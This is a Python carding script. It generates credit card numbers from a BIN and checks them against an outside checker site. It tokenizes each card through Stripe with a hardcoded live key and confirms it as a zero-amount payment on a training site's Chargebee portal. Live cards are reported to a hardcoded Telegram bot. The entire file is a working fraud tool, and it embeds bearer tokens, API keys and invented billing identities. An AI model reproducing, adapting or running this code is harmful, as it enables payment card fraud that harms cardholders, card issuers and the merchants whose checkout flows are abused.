import time, sys ,os ,threading, re, datetime
import grequests,requests, json, random
from random import randint
import requests as reqs

#proxies = {"http": "socks5://127.0.0.1:1080","https": "socks5://127.0.0.1:1080"}
proxies = {
}
response = requests.get("https://ifconfig.me/", proxies=proxies)

print(str(response.text))

def CheckElSite():
    urls=[]
    with open('card.txt', 'rt') as f:
        lines = f.read().splitlines()
        for i in lines:
            card = i.split('|')
            url='http://eldersc0de.ru/card/ccn5/api.php?testar=cc&ccs={0}|{1}|{2}|{3}&separador=|&id=0'.format(card[0],card[1],card[2],card[3])
            urls.append(url)
        rs = (grequests.get(u,timeout=40) for u in urls)
        a=grequests.map(rs)
        if a != None:
	        for i in range(0,len(a)):
	            rstext = a[i].text
	            #print(rstext)
	            if len(re.findall(r'REPROVADA',rstext)) < 2:
	                #print(len(re.findall(r'REPROVADA',rstext)))
	                send_mess(str(rstext.encode('utf-8')))
	                with open('cardok.txt', 'a') as f:
	                    lines = f.write(str(rstext.encode('utf-8')))
	            else:
	            	print("ALL Fail")

def GetBearer():
	url= 'https://linuxacademy.chargebee.com/api/v2/payment_intents'
	headers={'Host': 'linuxacademy.chargebee.com',
	'Connection': 'keep-alive',
	'Sec-Fetch-Mode': 'cors',
	'Origin': 'https://linuxacademy.chargebee.com',
	'Authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJzZXNzaW9uX3Rva2VuIjoiQ2N1WFJ0RmRrY3U2ekF3Q2NkRm1IdllPYjZyY2VISHV2YmIiLCJjdXN0b21lcl9oYW5kbGUiOiI2NjQ3MDQiLCJocF90b2tlbiI6InlSMml2dGRoUlRFeEg1UnI1UllOM0MwR3VPY3VWT3FKTSIsImlzcyI6ImNoYXJnZWJlZSIsInNjb3BlcyI6WyJNQU5BR0VfUEFZTUVOVFMiXSwiZXhwIjoxNTcyNDA5MjExfQ.oSnsycYQBNMLjBQ_CN_A5_fl-REP6Iy4Cbbmej1T42A',
	'Content-Type': 'application/x-www-form-urlencoded',
	'Accept': 'application/json, text/plain, */*',
	'CbSource': 'viaCp',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
	'Sec-Fetch-Site': 'same-origin',
	'Referer': 'https://linuxacademy.chargebee.com/portal/v2/payment_methods/add?source=portal_add_payment_method',
	'Accept-Encoding': 'gzip, deflate, br',
	'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8'	}
	data='amount=0&currency_code=USD&gateway_account_id=gw_HqVjsvzRXMzTQR1CgL&customer_id=664704&locale=en'
	response = requests.post(url, headers=headers,data=data,proxies=proxies)
	#to Debug
	print(response.json())
	bearerid=response.json()['payment_intent']['id']
	return bearerid
def PutCard(location):
	#bearer=GetBearer()
	datas=[]
	listid=[]
	tokid=None
	url='https://api.stripe.com/v1/tokens'
	headers={
	'Accept': 'application/json',
	'Referer': 'https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Flinuxacademy.chargebee.com&stripe_xdm_c=default123042&stripe_xdm_p=1',
	'Origin':'https://js.stripe.com',
	'Accept-Language': 'en-US',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
	'Sec-Fetch-Mode': 'cors',
	'Content-Type': 'application/x-www-form-urlencoded'}
	with open('card.txt', 'rt') as f:
		lines = f.read().splitlines()
		for i in lines:
			card = i.split('|')
			if location == 'vn':
				data='time_on_page=981835&pasted_fields=number&guid=NA&muid=72ce9e1b-096d-42fb-a1b8-ba5d52e9dc14&sid=f14b49c7-2f16-4e3f-857e-c7e8f5d90b97&key=pk_live_Jbyvm559N3SuCJKasSFUY7ti006avedEvy&payment_user_agent=stripe.js%2F551a9ed&card[number]={0}&card[cvc]={3}&card[exp_month]={1}&card[exp_year]={2}&card[name]=minh+tran&card[address_line1]=16+Ph%C3%BA+Th%E1%BB%8D&card[address_city]=ho+chi+minh&card[address_state]=quan+11&card[address_zip]=700000&card[address_country]=VN'.format(card[0],card[1],card[2],card[3])
			else:
				data='time_on_page=1194019&pasted_fields=number&guid=103fef82-6a5c-43d3-901e-3351d690e464&muid=72ce9e1b-096d-42fb-a1b8-ba5d52e9dc14&sid=0d6aa508-61e5-4ca1-8f23-e0837674d2e6&key=pk_live_Jbyvm559N3SuCJKasSFUY7ti006avedEvy&payment_user_agent=stripe.js%2F551a9ed&card[number]={0}&card[cvc]={3}&card[exp_month]={1}&card[exp_year]={2}&card[name]=Frank+Owsley&card[address_line1]=+Frosty+Lane&card[address_city]=Charlotte&card[address_state]=NC&card[address_zip]=28216&card[address_country]=US'.format(card[0],card[1],card[2],card[3])
			datas.append(data)
	newlines=[]
	count=0
	for i in datas:
		response = requests.post(url, headers=headers,data=i,proxies=proxies)
		#To debug 
		print(response.json())
		if 'id' not in response.json():
			count=count+1
			continue
		tokid = response.json()['id']
		newlines.append(lines[count])
		listid.append(tokid)
		count=count+1
	print(len(listid))
	return listid, newlines

def CheckCard(location):
	idbearer=GetBearer()
	print(idbearer)
	tokid= PutCard(location)
	print(tokid)
	listdata=[]
	url='https://linuxacademy.chargebee.com/api/internal/payment_intents/confirm'
	
	headers={'Host': 'linuxacademy.chargebee.com',
	'Connection': 'keep-alive',
	'Sec-Fetch-Mode': 'cors',
	'Origin': 'https://js.chargebee.com',
	'Authorization': 'Bearer {0}'.format(idbearer),
	'Content-Type': 'application/json',
	'Accept': 'application/json, text/plain, */*',
	'X-Requested-With': 'XMLHttpRequest',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
	'Sec-Fetch-Site': 'same-site',
	'Referer': 'https://js.chargebee.com/v2/master.html',
	'Accept-Encoding': 'gzip, deflate, br',
	'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8'}
	count = 0
	for i in tokid[0]:
		data = {'tmpToken': i, 'reattempt': 'true'}
		listdata.append(data)

		response = requests.post(url, headers=headers,data=json.dumps(data),proxies=proxies)
		try:
			result = response.json()['payment_intent']['active_payment_attempt']
			#print(result)
			print (result['status'])
			if  not re.match(result['status'],'refused'):
				with open('cardstatus.txt', 'a') as f:
					f.write(str(result['status'])+' '+str(tokid[1][count])+'\n')
					send_mess(str(result['status'])+' '+str(tokid[1][count]))
		except:
			with open('cardstatus.txt', 'a') as f:
				print(response.json())
				f.write(str(response.json()) + '\n')	
		count = count +1
		
def PutCard2():
	#bearer=GetBearer()
	datas=[]
	listid=[]
	url='https://api.stripe.com/v1/tokens'
	headers={
	'Accept': 'application/json',
	'Referer': 'https://js.stripe.com/v2/channel.html?stripe_xdm_e=https%3A%2F%2Flinuxacademy.chargebee.com&stripe_xdm_c=default123042&stripe_xdm_p=1',
	'Origin':'https://js.stripe.com',
	'Accept-Language': 'en-US',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
	'Sec-Fetch-Mode': 'cors',
	'Content-Type': 'application/x-www-form-urlencoded'}
	with open('card.txt', 'rt') as f:
		lines = f.read().splitlines()
		for i in lines:
			card = i.split('|')
			#data='time_on_page=981835&pasted_fields=number&guid=NA&muid=72ce9e1b-096d-42fb-a1b8-ba5d52e9dc14&sid=f14b49c7-2f16-4e3f-857e-c7e8f5d90b97&key=pk_live_Jbyvm559N3SuCJKasSFUY7ti006avedEvy&payment_user_agent=stripe.js%2F551a9ed&card[number]={0}&card[cvc]={3}&card[exp_month]={1}&card[exp_year]={2}&card[name]=minh+tran&card[address_line1]=16+Ph%C3%BA+Th%E1%BB%8D&card[address_city]=ho+chi+minh&card[address_state]=quan+11&card[address_zip]=700000&card[address_country]=VN'.format(card[0],card[1],card[2],card[3])
			data='time_on_page=1194019&pasted_fields=number&guid=103fef82-6a5c-43d3-901e-3351d690e464&muid=72ce9e1b-096d-42fb-a1b8-ba5d52e9dc14&sid=0d6aa508-61e5-4ca1-8f23-e0837674d2e6&key=pk_live_Jbyvm559N3SuCJKasSFUY7ti006avedEvy&payment_user_agent=stripe.js%2F551a9ed&card[number]={0}&card[cvc]={3}&card[exp_month]={1}&card[exp_year]={2}&card[name]=Frank+Owsley&card[address_line1]=+Frosty+Lane&card[address_city]=Charlotte&card[address_state]=NC&card[address_zip]=28216&card[address_country]=US'.format(card[0],card[1],card[2],card[3])
			datas.append(data)
	#idbearer=GetBearer()
	
	for i in datas:
		count = 0
		url='https://api.stripe.com/v1/tokens'
		response = None
		response = requests.post(url, headers=headers,data=i,proxies=proxies)

		print ((response.json()))
		tokid = response.json()['id']
		idbearer=GetBearer()
		print(idbearer)
		print(tokid)
		listdata=[]
		url='https://linuxacademy.chargebee.com/api/internal/payment_intents/confirm'
		
		headers={'Host': 'linuxacademy.chargebee.com',
		'Connection': 'keep-alive',
		'Sec-Fetch-Mode': 'cors',
		'Origin': 'https://js.chargebee.com',
		'Authorization': 'Bearer {0}'.format(idbearer),
		'Content-Type': 'application/json',
		'Accept': 'application/json, text/plain, */*',
		'X-Requested-With': 'XMLHttpRequest',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
		'Sec-Fetch-Site': 'same-site',
		'Referer': 'https://js.chargebee.com/v2/master.html',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8'}
		data = {'tmpToken': tokid, 'reattempt': 'true'}
		listdata.append(data)

		response = requests.post(url, headers=headers,data=json.dumps(data),proxies=proxies)
		result = response.json()['payment_intent']['active_payment_attempt']
		print (result['status']['status'])
		if  re.match(result['status'],'refused'):
				with open('cardstatus.txt', 'a') as f:
					f.write(str(result)+'\n')
					

def send_mess(text):
	url = "https://api.telegram.org/bot751128068:AAG4FraAKZ_es9ymZxy5dlhg3sJGtJpgKdw/"
	params = {'chat_id':"531864213", 'text': text}
	response = requests.post(url + 'sendMessage', data=params)
	return response
def BinChecker(bins='52172918519',month='',year='',cvv=''):
	FBin = bins
	Bin = FBin.replace(' ' , '')
	Bin = Bin.replace('x' ,'')
	Bin = Bin.replace('X', '')
	Bin = Bin[:6]

	url = "https://www.lookupbin.com/bin?bin=" + Bin

	response = reqs.get(url)

	if "is not a known BIN" in (response.text):
		print ("\n", Bin, "is not a known BIN")

		check = raw_input("\nWARNING....!..The BIN is not proper BIN. CC with these BIN may not works properly \n Do you want to change the BIN (yes/no | Default:yes): ")
		if check in ['n', 'N', 'No', 'no', 'NO']:
			quit()
		else:
			BinChecker()
	else:
		if "BIN" in (response.text):
			BIN = ((response.text).split("BIN:",2)[-1]).split("</div></div>", 1)[0][28:]
			print ("\nBIN:", BIN)

		if "Network" in (response.text):
			Network = str((response.text).split("Network:",2)[-1]).split("</div></div>", 1)[0][28:]
			print ("Network:", Network)

		if "Brand" in (response.text):
			Brand = str((response.text).split("Brand:",2)[-1]).split("</div></div>", 1)[0][28:]
			print ("Brand:", Brand)

		if "Type" in (response.text):
			Type = str((response.text).split("Type:",2)[-1]).split("</div></div>", 1)[0][28:]
			print ("Type:", Type)

		if "Prepaid" in (response.text):
			Prepaid = (response.text).split("Prepaid:",2)[-1].split("</div></div>", 1)[0][28:]
			print ("Prepaid:", Prepaid)

		if 'Country:' in (response.text):
			Country = str((response.text).split("Country:",2)[-1]).split("</div></div>", 1)[0][28:]
			print ("Country:", Country)

		if "Bank:" in (response.text):
			Bank = ((response.text).split("Bank:",2)[-1]).split("</div></div>", 1)[0][28:]
			print ("Bank:", Bank)
		print ("\nWARNING....!we are not responsible for your malicious activities..!")
		ccgen(FBin, Network)

def ccgen(FBin, Network):
	if (len(FBin) < 16):
		FBin = FBin+((16-(len(FBin)))*'x')
	
	TBin = FBin
	nocc = 30

	print ("\nGenerated Credit Cards")
	#print "Credit Card No | Month | Years | CVV | Card Status"
	open('card.txt', 'w').close()
	for i in range(nocc):
		for i in range(len(TBin)):

			n = str(random.randint(0, 9))
			m = str(random.randint(1, 12))
			if (len(m) == 1):
				m = '0' + m
			y = str(random.randint(2021, 2025))
			
			if (Network == 'amex'):
				cv = str(random.randint(1000, 9999))
			else:
				cv = str(random.randint(100, 999))	

			c = TBin[i]
			if (c == 'x' or c == 'X'):
				FBin = FBin[:i] + str(n) + FBin[i+1:]

		cc = FBin + '|' + m + '|' +  y + '|' + cv
		#ccchecker(cc)

		with open('card.txt', 'a') as f:
			f.write(str(cc)+'\n')

def ccchecker(cc):

	url = "https://mrchecker.net/card/ccn2"
	
	form = {
		'ajax':'1',
		'cclist':cc,
		'do':'check'
	}

	response = reqs.post(url, form, stream = True)

	if 'Live' in (response.text):
		print (cc, "| Live")
	elif 'Unknown' in (response.text):
		print (cc, "| Unknown")
	else :
		print (cc, "| Die")


	print ('\nIf there is no Live BINs try once again by increasing the number of Card needed')
while True:
		if len(sys.argv)<3:
			BinChecker("46701001249")
		else:
			BinChecker(sys.argv[1])
		CheckElSite()
		CheckCard(sys.argv[2])
# #main()
# #get_offline()
# #AddFalseStart()
# print("Start Run")
# #schedule.every(5).minutes.do(startmain)
# if len(sys.argv)==2:
	# time.sleep(200)
	# get_device(2)
# if len(sys.argv)==3:
	# get_device2()
	# get_device(2)
# if len(sys.argv)==4:
	# get_device(1)	
#schedule.every(120).minutes.do(main)
#schedule.every(1).minutes.do(get_offline)
#schedule.every(123).minutes.do(get_device)
print("Finish Run")
#send_mess("Start At: "+str(datetime.datetime.now()))
#schedule.every().day.at("10:56").do(startmain).tag('main2')
#schedule.every().day.at("20:00").do(get_device2)
#schedule.every().day.at("14:00").do(cancelschedule).tag('cancelmain')
#while 1:
#	schedule.run_pending()
#	time.sleep(1)
	#print("Run...")
